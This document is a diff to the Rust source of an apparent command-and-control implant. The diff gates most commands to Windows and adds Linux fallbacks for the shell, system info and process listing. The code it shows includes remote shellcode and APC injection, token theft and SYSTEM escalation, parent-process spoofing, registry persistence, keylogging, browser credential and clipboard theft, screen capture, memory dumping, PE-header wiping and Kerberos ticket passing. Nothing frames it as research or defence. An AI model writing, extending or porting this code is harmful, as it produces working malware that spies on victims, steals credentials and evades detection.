@@ -2,26 +2,35 @@
 
 // Declare sibling source files via explicit path so main.rs stays untouched.
 // Rust resolves #[path] relative to the directory of the declaring file (src/).
+#[cfg(target_os = "windows")]
 #[path = "kerberos.rs"]
 mod kerberos;
+#[cfg(target_os = "windows")]
 #[path = "pe_exec.rs"]
 mod pe_exec;
+#[cfg(target_os = "windows")]
 #[path = "commands_injection.rs"]
 mod commands_injection;
+#[cfg(target_os = "windows")]
 #[path = "commands_tokens.rs"]
 mod commands_tokens;
+#[cfg(target_os = "windows")]
 #[path = "commands_defense.rs"]
 mod commands_defense;
+#[cfg(target_os = "windows")]
 #[path = "commands_utils.rs"]
 mod commands_utils;
 #[path = "commands_ishell.rs"]
 mod commands_ishell;
+#[cfg(target_os = "windows")]
 #[path = "keylog.rs"]
 mod keylog;
 #[path = "socks.rs"]
 mod socks;
+#[cfg(target_os = "windows")]
 #[path = "browser_creds.rs"]
 mod browser_creds;
+#[cfg(target_os = "windows")]
 #[path = "clipboard.rs"]
 mod clipboard;
 #[path = "rsocks.rs"]
@@ -45,15 +54,19 @@ fn dyn_working_hours() -> std::sync::MutexGuard<'static, String> {
     DYN_WORKING_HOURS.get_or_init(|| Mutex::new(String::new())).lock().unwrap()
 }
 
-// ── Screenwatch globals ───────────────────────────────────────────────────────
+// ── Screenwatch globals (Windows only) ───────────────────────────────────────
 
+#[cfg(target_os = "windows")]
 static SCREENWATCH_STOP: AtomicBool = AtomicBool::new(false);
+#[cfg(target_os = "windows")]
 static SCREENWATCH_HANDLE: OnceLock<Mutex<Option<std::thread::JoinHandle<()>>>> = OnceLock::new();
 
+#[cfg(target_os = "windows")]
 fn screenwatch_handle() -> std::sync::MutexGuard<'static, Option<std::thread::JoinHandle<()>>> {
     SCREENWATCH_HANDLE.get_or_init(|| Mutex::new(None)).lock().unwrap()
 }
 
+#[cfg(target_os = "windows")]
 fn spawn_screenwatch_thread(agent_id: String, aes_key: Vec<u8>, interval_sec: u64) {
     SCREENWATCH_STOP.store(false, Ordering::Relaxed);
     let handle = std::thread::spawn(move || {
@@ -94,6 +107,9 @@ fn spawn_screenwatch_thread(agent_id: String, aes_key: Vec<u8>, interval_sec: u6
     *screenwatch_handle() = Some(handle);
 }
 
+// ── Shell helpers ─────────────────────────────────────────────────────────────
+
+#[cfg(target_os = "windows")]
 fn shell(cmd: &str) -> String {
     match Command::new("cmd.exe").args(["/s", "/c", cmd]).output() {
         Ok(o) => {
@@ -106,6 +122,20 @@ fn shell(cmd: &str) -> String {
     }
 }
 
+#[cfg(not(target_os = "windows"))]
+fn shell(cmd: &str) -> String {
+    match Command::new("sh").args(["-c", cmd]).output() {
+        Ok(o) => {
+            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
+            let err = String::from_utf8_lossy(&o.stderr);
+            if !err.is_empty() { out.push_str(&err); }
+            out
+        }
+        Err(e) => format!("[error: {}]", e),
+    }
+}
+
+#[cfg(target_os = "windows")]
 fn ps(script: &str) -> String {
     match Command::new("powershell.exe")
         .args(["-NoP", "-NonI", "-W", "Hidden", "-C", script])
@@ -121,15 +151,18 @@ fn ps(script: &str) -> String {
     }
 }
 
+#[cfg(target_os = "windows")]
 fn wide(s: &str) -> Vec<u16> {
     s.encode_utf16().chain([0u16]).collect()
 }
 
 // ── Native Windows helpers ────────────────────────────────────────────────────
 
+#[cfg(target_os = "windows")]
 use windows_sys::Win32::Foundation::{
     CloseHandle, GetLastError, HANDLE, INVALID_HANDLE_VALUE, LUID, PAPCFUNC,
 };
+#[cfg(target_os = "windows")]
 use windows_sys::Win32::System::Threading::{
     OpenProcess, CreateRemoteThread, OpenThread, GetCurrentProcess, QueueUserAPC,
     OpenProcessToken, CreateProcessW, ResumeThread,
@@ -138,22 +171,28 @@ use windows_sys::Win32::System::Threading::{
     EXTENDED_STARTUPINFO_PRESENT, CREATE_SUSPENDED, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
     STARTUPINFOEXW, PROCESS_INFORMATION, LPPROC_THREAD_ATTRIBUTE_LIST,
 };
+#[cfg(target_os = "windows")]
 use windows_sys::Win32::System::Memory::{
     VirtualAllocEx, VirtualProtectEx,
     GetProcessHeap, HeapAlloc, HeapFree,
     MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
 };
+#[cfg(target_os = "windows")]
 use windows_sys::Win32::System::Diagnostics::Debug::{
     WriteProcessMemory, GetThreadContext, SetThreadContext,
     CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
 };
+#[cfg(target_os = "windows")]
 use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
+#[cfg(target_os = "windows")]
 use windows_sys::Win32::System::Memory::VirtualProtect;
+#[cfg(target_os = "windows")]
 use windows_sys::Win32::System::Diagnostics::ToolHelp::{
     CreateToolhelp32Snapshot, Thread32First, Thread32Next,
     Process32First, Process32Next,
     THREADENTRY32, PROCESSENTRY32, TH32CS_SNAPTHREAD, TH32CS_SNAPPROCESS,
 };
+#[cfg(target_os = "windows")]
 use windows_sys::Win32::Security::{
     DuplicateTokenEx, ImpersonateLoggedOnUser, RevertToSelf,
     AdjustTokenPrivileges, LookupPrivilegeValueW,
@@ -163,6 +202,7 @@ use windows_sys::Win32::Security::{
     SE_PRIVILEGE_ENABLED, TOKEN_PRIVILEGES, LUID_AND_ATTRIBUTES,
 };
 
+#[cfg(target_os = "windows")]
 unsafe fn enable_priv(htok: HANDLE, priv_name: &str) -> bool {
     let name_w = wide(priv_name);
     let mut luid: LUID = std::mem::zeroed();
@@ -175,6 +215,7 @@ unsafe fn enable_priv(htok: HANDLE, priv_name: &str) -> bool {
         std::ptr::null_mut(), std::ptr::null_mut()) != 0
 }
 
+#[cfg(target_os = "windows")]
 unsafe fn inject_remote(pid: u32, sc: &[u8]) -> String {
     let hproc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
     if hproc == 0 { return format!("OpenProcess failed (err {})", GetLastError()); }
@@ -194,6 +235,7 @@ unsafe fn inject_remote(pid: u32, sc: &[u8]) -> String {
     format!("[+] injected {} bytes into PID {} (TID={})", sc.len(), pid, tid)
 }
 
+#[cfg(target_os = "windows")]
 unsafe fn inject_apc(pid: u32, sc: &[u8]) -> String {
     let hproc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
     if hproc == 0 { return format!("OpenProcess failed (err {})", GetLastError()); }
@@ -226,6 +268,7 @@ unsafe fn inject_apc(pid: u32, sc: &[u8]) -> String {
     format!("[+] APC queued to {} thread(s) in PID {}", queued, pid)
 }
 
+#[cfg(target_os = "windows")]
 unsafe fn token_steal(pid: u32) -> String {
     let mut hself = 0isize;
     if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut hself) != 0 {
@@ -253,6 +296,7 @@ unsafe fn token_steal(pid: u32) -> String {
     format!("[+] impersonating token from PID {}", pid)
 }
 
+#[cfg(target_os = "windows")]
 unsafe fn token_make(user: &str, domain: &str, pass: &str) -> String {
     let wu = wide(user); let wd = wide(domain); let wp = wide(pass);
     let mut htok = 0isize;
@@ -268,6 +312,7 @@ unsafe fn token_make(user: &str, domain: &str, pass: &str) -> String {
     format!("[+] impersonating {}\\{}", domain, user)
 }
 
+#[cfg(target_os = "windows")]
 unsafe fn get_system() -> String {
     let mut hself = 0isize;
     if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut hself) != 0 {
@@ -310,6 +355,7 @@ unsafe fn get_system() -> String {
     format!("[+] SYSTEM token (winlogon PID={})", sys_pid)
 }
 
+#[cfg(target_os = "windows")]
 unsafe fn spawn_with_ppid(cmd: &str, parent_name: &str) -> String {
     let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if snap == INVALID_HANDLE_VALUE { return "CreateToolhelp32Snapshot failed".into(); }
@@ -369,6 +415,9 @@ unsafe fn spawn_with_ppid(cmd: &str, parent_name: &str) -> String {
     format!("[+] spawned '{}' (PID={}) with parent {}({})", cmd, pi.dwProcessId, parent_name, parent_pid)
 }
 
+// ── Sysinfo ───────────────────────────────────────────────────────────────────
+
+#[cfg(target_os = "windows")]
 fn sysinfo() -> String {
     let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into());
     let username = std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".into());
@@ -378,6 +427,31 @@ fn sysinfo() -> String {
         hostname, username, arch, std::process::id()
     )
 }
+
+#[cfg(not(target_os = "windows"))]
+fn sysinfo() -> String {
+    let hostname = std::fs::read_to_string("/proc/sys/kernel/hostname")
+        .map(|s| s.trim().to_string())
+        .unwrap_or_else(|_| std::env::var("HOSTNAME").unwrap_or_else(|_| "UNKNOWN".into()));
+    let username = std::env::var("USER")
+        .or_else(|_| std::env::var("LOGNAME"))
+        .unwrap_or_else(|_| "UNKNOWN".into());
+    let arch = if cfg!(target_arch = "x86_64") { "amd64" } else { "x86" };
+    let os_name = std::fs::read_to_string("/etc/os-release")
+        .map(|s| {
+            s.lines()
+                .find(|l| l.starts_with("PRETTY_NAME="))
+                .map(|l| l.trim_start_matches("PRETTY_NAME=").trim_matches('"').to_string())
+                .unwrap_or_else(|| "linux".to_string())
+        })
+        .unwrap_or_else(|_| "linux".to_string());
+    format!(
+        "hostname={}\nusername={}\nos={}/{}\npid={}",
+        hostname, username, os_name, arch, std::process::id()
+    )
+}
+
+// ── Directory listing ─────────────────────────────────────────────────────────
 
 fn ls(path: &str) -> String {
     let dir = if path.is_empty() {
@@ -418,7 +492,10 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             t.send_result(task.id, &sysinfo(), "");
         }
         "PS" => {
+            #[cfg(target_os = "windows")]
             t.send_result(task.id, &shell("tasklist /FO CSV /NH 2>&1"), "");
+            #[cfg(not(target_os = "windows"))]
+            t.send_result(task.id, &shell("ps aux"), "");
         }
         "PWD" => {
             let cwd = std::env::current_dir()
@@ -459,12 +536,10 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
                                     .and_then(|t| {
                                         let secs = t.duration_since(std::time::UNIX_EPOCH).ok()?.as_secs();
                                         let dt_secs = secs as i64;
-                                        // Format as YYYY-MM-DD HH:mm (simple calc)
                                         let days = dt_secs / 86400;
                                         let rem  = dt_secs % 86400;
                                         let hh   = rem / 3600;
                                         let mm   = (rem % 3600) / 60;
-                                        // Days since 1970-01-01
                                         let mut y = 1970i32; let mut d = days as i32;
                                         loop {
                                             let yd = if (y%4==0&&y%100!=0)||(y%400==0) {366} else {365};
@@ -486,21 +561,39 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             }
         }
         "PS_JSON" => {
-            let raw = shell("tasklist /FO CSV /NH 2>&1");
-            let mut procs = Vec::new();
-            for line in raw.lines() {
-                let line = line.trim().trim_matches('"');
-                let parts: Vec<&str> = line.splitn(6, "\",\"").collect();
-                if parts.len() >= 2 {
-                    let name = parts[0].trim_matches('"');
-                    let pid_str = parts[1].trim_matches('"');
-                    if let Ok(pid) = pid_str.parse::<u32>() {
-                        procs.push(serde_json::json!({"pid": pid, "name": name, "security": ""}));
+            #[cfg(target_os = "windows")]
+            {
+                let raw = shell("tasklist /FO CSV /NH 2>&1");
+                let mut procs = Vec::new();
+                for line in raw.lines() {
+                    let line = line.trim().trim_matches('"');
+                    let parts: Vec<&str> = line.splitn(6, "\",\"").collect();
+                    if parts.len() >= 2 {
+                        let name = parts[0].trim_matches('"');
+                        let pid_str = parts[1].trim_matches('"');
+                        if let Ok(pid) = pid_str.parse::<u32>() {
+                            procs.push(serde_json::json!({"pid": pid, "name": name, "security": ""}));
+                        }
                     }
                 }
+                t.send_result(task.id, &serde_json::to_string(&procs).unwrap_or_default(), "");
             }
-            t.send_result(task.id, &serde_json::to_string(&procs).unwrap_or_default(), "");
+            #[cfg(not(target_os = "windows"))]
+            {
+                let raw = shell("ps -eo pid,comm --no-headers 2>/dev/null");
+                let mut procs = Vec::new();
+                for line in raw.lines() {
+                    let parts: Vec<&str> = line.trim().splitn(2, ' ').collect();
+                    if parts.len() == 2 {
+                        if let Ok(pid) = parts[0].trim().parse::<u32>() {
+                            procs.push(serde_json::json!({"pid": pid, "name": parts[1].trim(), "security": ""}));
+                        }
+                    }
+                }
+                t.send_result(task.id, &serde_json::to_string(&procs).unwrap_or_default(), "");
+            }
         }
+        #[cfg(target_os = "windows")]
         "DRIVES" => {
             let raw = shell("wmic logicaldisk get name /format:list 2>&1");
             let mut entries = Vec::new();
@@ -516,6 +609,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             let resp = serde_json::json!({"cwd": "", "path": "", "drives": true, "entries": entries});
             t.send_result(task.id, &resp.to_string(), "");
         }
+        #[cfg(target_os = "windows")]
         "NET_SHARES" => {
             let host = task.args.trim().trim_start_matches('\\').trim_start_matches('/');
             let raw = shell(&format!("net view \\\\{} /all 2>&1", host));
@@ -610,6 +704,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
                 .join("\n");
             t.send_result(task.id, &out, "");
         }
+        #[cfg(target_os = "windows")]
         "SCREENSHOT" => {
             let sc_ps = concat!(
                 "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;",
@@ -645,6 +740,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             }
             t.send_result(task.id, "[+] config updated", "");
         }
+        #[cfg(target_os = "windows")]
         "INJECT_REMOTE" => {
             if task.payload.is_empty() { t.send_result(task.id, "", "no shellcode payload"); return; }
             let pid = serde_json::from_str::<serde_json::Value>(&task.args)
@@ -653,6 +749,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             let r = unsafe { inject_remote(pid, &task.payload) };
             t.send_result(task.id, &r, "");
         }
+        #[cfg(target_os = "windows")]
         "INJECT_APC" => {
             if task.payload.is_empty() { t.send_result(task.id, "", "no shellcode payload"); return; }
             let pid = serde_json::from_str::<serde_json::Value>(&task.args)
@@ -661,6 +758,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             let r = unsafe { inject_apc(pid, &task.payload) };
             t.send_result(task.id, &r, "");
         }
+        #[cfg(target_os = "windows")]
         "DOTNET_EXEC" => {
             let j = serde_json::from_str::<serde_json::Value>(&task.args).unwrap_or_default();
             let b64 = j.get("asm").and_then(|v| v.as_str()).unwrap_or("");
@@ -673,6 +771,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             let r = crate::dotnet::exec_dotnet(&asm_bytes, &asm_args);
             t.send_result(task.id, &r, "");
         }
+        #[cfg(target_os = "windows")]
         "TOKEN_STEAL" => {
             let pid = serde_json::from_str::<serde_json::Value>(&task.args)
                 .ok().and_then(|v| v.get("pid").and_then(|p| p.as_u64())).unwrap_or(0) as u32;
@@ -680,6 +779,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             let r = unsafe { token_steal(pid) };
             t.send_result(task.id, &r, "");
         }
+        #[cfg(target_os = "windows")]
         "TOKEN_MAKE" => {
             let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
             let user   = j.get("user").and_then(|v| v.as_str()).unwrap_or("");
@@ -691,17 +791,21 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             let r = unsafe { token_make(user, domain, pass) };
             t.send_result(task.id, &r, "");
         }
+        #[cfg(target_os = "windows")]
         "TOKEN_DROP" => {
             unsafe { RevertToSelf(); }
             t.send_result(task.id, "[+] reverted to original token", "");
         }
+        #[cfg(target_os = "windows")]
         "TOKEN_WHOAMI" => {
             t.send_result(task.id, &shell("whoami 2>&1"), "");
         }
+        #[cfg(target_os = "windows")]
         "GETSYSTEM" => {
             let r = unsafe { get_system() };
             t.send_result(task.id, &r, "");
         }
+        #[cfg(target_os = "windows")]
         "PERSIST" => {
             let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
             let name = j.get("name").and_then(|v| v.as_str()).unwrap_or("Updater");
@@ -715,6 +819,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             };
             t.send_result(task.id, &out, "");
         }
+        #[cfg(target_os = "windows")]
         "PERSIST_RM" => {
             let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
             let name = j.get("name").and_then(|v| v.as_str()).unwrap_or("");
@@ -727,12 +832,15 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             };
             t.send_result(task.id, &out, "");
         }
+        #[cfg(target_os = "windows")]
         "REG_QUERY" => {
             t.send_result(task.id, &shell(&format!("reg query \"{}\" 2>&1", task.args)), "");
         }
+        #[cfg(target_os = "windows")]
         "REG_LIST" => {
             t.send_result(task.id, &shell(&format!("reg query \"{}\" /s 2>&1", task.args)), "");
         }
+        #[cfg(target_os = "windows")]
         "REG_SET" => {
             let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
             let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("");
@@ -742,6 +850,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             let out  = shell(&format!("reg add \"{}\" /v \"{}\" /t {} /d \"{}\" /f 2>&1", path, name, typ2, val));
             t.send_result(task.id, &out, "");
         }
+        #[cfg(target_os = "windows")]
         "REG_DELETE" => {
             let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
             let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("");
@@ -753,6 +862,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             };
             t.send_result(task.id, &shell(&cmd2), "");
         }
+        #[cfg(target_os = "windows")]
         "PORT_SCAN" => {
             let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
             let host    = j.get("host").and_then(|v| v.as_str()).unwrap_or("127.0.0.1");
@@ -768,6 +878,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             let out = ps(&script);
             t.send_result(task.id, if out.trim().is_empty() { "no open ports" } else { &out }, "");
         }
+        #[cfg(target_os = "windows")]
         "MINIDUMP" => {
             let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
             let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("C:\\Windows\\Temp\\1.dmp");
@@ -782,6 +893,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
                 t.send_result(task.id, &out, "");
             }
         }
+        #[cfg(target_os = "windows")]
         "PPID" => {
             let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
             let cmd2   = j.get("cmd").and_then(|v| v.as_str()).unwrap_or("");
@@ -790,6 +902,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             let r = unsafe { spawn_with_ppid(cmd2, parent) };
             t.send_result(task.id, &r, "");
         }
+        #[cfg(target_os = "windows")]
         "HWBP_CLEAR" => {
             use windows_sys::Win32::System::Threading::{GetCurrentThreadId, THREAD_GET_CONTEXT, THREAD_SET_CONTEXT};
             let r = unsafe {
@@ -811,6 +924,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             };
             t.send_result(task.id, &r, "");
         }
+        #[cfg(target_os = "windows")]
         "WIPE_MZ" => {
             let r = unsafe {
                 let base = GetModuleHandleW(std::ptr::null()) as *mut u8;
@@ -827,10 +941,12 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             };
             t.send_result(task.id, &r, "");
         }
+        #[cfg(target_os = "windows")]
         "KERB_LIST" => {
             let r = kerberos::kerb_list_tickets();
             t.send_result(task.id, &r, "");
         }
+        #[cfg(target_os = "windows")]
         "KERB_PTT" => {
             let b64 = serde_json::from_str::<serde_json::Value>(&task.args)
                 .ok()
@@ -843,10 +959,12 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             let r = kerberos::kerb_pass_ticket(&b64);
             t.send_result(task.id, &r, "");
         }
+        #[cfg(target_os = "windows")]
         "KERB_PURGE" => {
             let r = kerberos::kerb_purge();
             t.send_result(task.id, &r, "");
         }
+        #[cfg(target_os = "windows")]
         "EXEC_PE" => {
             if task.payload.is_empty() {
                 t.send_result(task.id, "", "EXEC_PE requires a PE payload");
@@ -855,6 +973,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             let r = pe_exec::exec_pe(&task.payload);
             t.send_result(task.id, &r, "");
         }
+        #[cfg(target_os = "windows")]
         "SCREENWATCH_START" => {
             let interval = if task.args.trim().starts_with('{') {
                 let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
@@ -867,20 +986,24 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             spawn_screenwatch_thread(agent_id, aes_key, interval);
             t.send_result(task.id, "[+] screenwatch started", "");
         }
+        #[cfg(target_os = "windows")]
         "SCREENWATCH_STOP" => {
             SCREENWATCH_STOP.store(true, Ordering::Relaxed);
             let handle = screenwatch_handle().take();
             if let Some(h) = handle { let _ = h.join(); }
             t.send_result(task.id, "[+] screenwatch stopped", "");
         }
+        #[cfg(target_os = "windows")]
         "KEYLOG_START" => {
             keylog::keylog_start();
             t.send_result(task.id, "[+] keylogger started", "");
         }
+        #[cfg(target_os = "windows")]
         "KEYLOG_STOP" => {
             keylog::keylog_stop();
             t.send_result(task.id, "[+] keylogger stopped", "");
         }
+        #[cfg(target_os = "windows")]
         "KEYLOG_DUMP" => {
             let out = keylog::keylog_dump();
             t.send_result(task.id, if out.is_empty() { "[no keystrokes]" } else { &out }, "");
@@ -901,20 +1024,25 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             socks::socks_stop();
             t.send_result(task.id, "[+] SOCKS5 proxy stopped", "");
         }
+        #[cfg(target_os = "windows")]
         "BROWSER_CREDS" => {
             let result = browser_creds::do_browser_creds();
             t.send_result(task.id, &result, "");
         }
+        #[cfg(target_os = "windows")]
         "CLIP_GET" => {
             t.send_result(task.id, &clipboard::clip_get(), "");
         }
+        #[cfg(target_os = "windows")]
         "CLIP_MONITOR_START" => {
             let secs: u64 = task.args.trim().parse().unwrap_or(5);
             t.send_result(task.id, clipboard::clip_monitor_start(secs), "");
         }
+        #[cfg(target_os = "windows")]
         "CLIP_MONITOR_DUMP" => {
             t.send_result(task.id, &clipboard::clip_monitor_dump(), "");
         }
+        #[cfg(target_os = "windows")]
         "CLIP_MONITOR_STOP" => {
             t.send_result(task.id, clipboard::clip_monitor_stop(), "");
         }
@@ -957,9 +1085,13 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
         }
         _ => {
             // Delegate to feature modules
+            #[cfg(target_os = "windows")]
             if commands_injection::dispatch(t, task) { return; }
+            #[cfg(target_os = "windows")]
             if commands_tokens::dispatch(t, task) { return; }
+            #[cfg(target_os = "windows")]
             if commands_defense::dispatch(t, task) { return; }
+            #[cfg(target_os = "windows")]
             if commands_utils::dispatch(t, task) { return; }
             if commands_ishell::dispatch(t, task)  { return; }
             t.send_result(task.id, "", &format!("unknown task type: {}", task.typ));
